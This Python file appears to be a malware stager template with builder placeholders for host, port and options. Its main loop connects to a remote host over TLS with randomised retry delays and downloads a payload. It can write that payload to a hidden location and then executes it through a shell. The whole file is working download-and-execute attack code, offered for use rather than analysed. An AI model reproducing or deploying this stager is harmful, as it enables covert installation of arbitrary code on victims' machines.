import subprocess
import ssl
import json
import socket
import time
import random
import os

from lib import pathfinder

# Constants
IP = addr_ip
PORT = addr_port

BLOCK_SIZE = block_size
STAGER_CODE = stager_code
PAYLOAD_FILE = output_file

HIDE_PAYLOAD = hide_payload


def connect():

    # sock obj
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)

    # connect
    sess = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_SSLv23)

    while True:
        try:
            sess.connect((IP, PORT))
            print('Establishing connection...')
            break
        except:
            time.sleep(random.randint(15, 30))

    print(f"connected with sess: {sess}")

    return sess


def get_payload(sess):

    # request payload
    sess.sendall(json.dumps({'code': STAGER_CODE, 'args': None}).encode())

    # download payload
    payload = b''

    print('Downloading payload...')
    while True:
        try:
            payload += sess.recv(BLOCK_SIZE)
        except:
            break

    return payload

print("Before while true block")
while True:
    print("Getting payload inside stager")
    payload = get_payload(connect())

    if len(payload):
        print("Payload variable has been created! Exinting the stager's while True block")
        print()
        break

    print('Failed to download payload.\nRetrying...\n')
    time.sleep(random.randint(15, 30))

# write to file
print(f"Hiding the payload? {HIDE_PAYLOAD}")
if HIDE_PAYLOAD:
    print(f"FYI pathfinder.Finder().find(): {pathfinder.Finder().find()}")
    path = os.path.join(pathfinder.Finder().find(), PAYLOAD_FILE)
else: 
    path = PAYLOAD_FILE

print(f"Looking for path: {path}")

with open(path, 'wb') as f:
    print(f"Writing payload to {f}!!!")
    for i in range(0, len(payload), BLOCK_SIZE):
        f.write(payload[i:i + BLOCK_SIZE])

print("Payload writing complete")

# execute
print(f"Calling subprocess.call of: {path.split()}")
if ".exe" in path:
    subprocess.call(path.split(), shell=True)
else:
    path = "./" + path
    subprocess.call(path.split(), shell=True)
